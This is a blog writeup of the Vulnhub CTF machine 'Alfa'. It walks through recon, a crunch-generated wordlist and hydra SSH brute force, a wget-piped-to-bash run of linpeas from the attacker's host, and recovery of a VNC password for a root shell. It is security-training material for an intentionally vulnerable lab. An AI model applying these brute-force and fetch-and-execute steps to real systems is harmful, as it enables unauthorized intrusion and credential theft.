---
title: "Writeup: Vulnhub - Alfa"
date: 2021-07-02T15:34:30-04:00
categories:
  - writeup
tags:
  - vulnhub
  - ctf
  - linux
  - web
---

Brief Writeup for [Alfa](https://www.vulnhub.com/entry/alfa-1,655/) created by d4t4s3c. 

## 0x01: Recon 

Initial port scan via nmap: 

![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-19-51-19.png)

Checkout if we can access ftp via anonymous:

![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-22-19-28.png)

Their was a picture of dog called "milo.jpg". Did not try **steghide** or similar tools at this point. 

Next up was the SMB service:

![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-22-21-06.png)

Default samba drives and no permissions. 

The next service is web and hosts a static html page. The robots txt contained an odd sequence at the end: 

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++++++.>>---.+++++++++++.------.-----.<<--.>>++++++++++++++++++.++.-----..-.+++.++.
```

Turned out that this is brainfuck code and used this [Page](https://www.tutorialspoint.com/execute_brainfk_online.php) for execution of the code. 


![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-22-25-00.png)

The code outputted "/alfa-support" and this was a much needed hint, because my common enumeration wordlists where exhausted at this point. 

## 0x02: Exploitation

Under "/alfa-support" is a static page that prints a dialog between the user Thomas and Alfa support for a password reset of his account. The dialog includes the info that thomas passwords consists out of his pet name and three digits so lets start crunch and hydra against the SSH service. 

```bash
# psw. generation with crunch
crunch 7 7 -t milo%%% -o /tmp/psw
# crack it with hydra
hydra -l thomas -P /tmp/psw 192.168.56.106 -s 65111 ssh
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-22-36-34.png)

After some time hydra found the password "milo666" for thomas and found the user flag. 

![]({{ site.url }}{{ site.baseurl }}/ assets/images/2021-07-03-22-39-30.png)

## 0x03: Privilege Escalation

Started of with linpeas and found that VNC is running bound to localhost. The current user has file ".remote_secret" that seems to be a VNC password. 

```bash
# linpeas execution
wget http://http://192.168.56.1:8081/linpeas.sh -O- | bash > /tmp/log
```
With the tool "vncpwd" the pswd "k!LL3rSs" was restored and forwarded the port 5901 via ssh. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-22-41-37.png)

Loggin in via vncviewer and root shell greets you. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/2021-07-03-22-44-37.png)

## 0xFF: Feedback 

The VM is pretty straightforward and I enjoyed the VNC part a lot. Thanks to d4t4s3c for creating it!


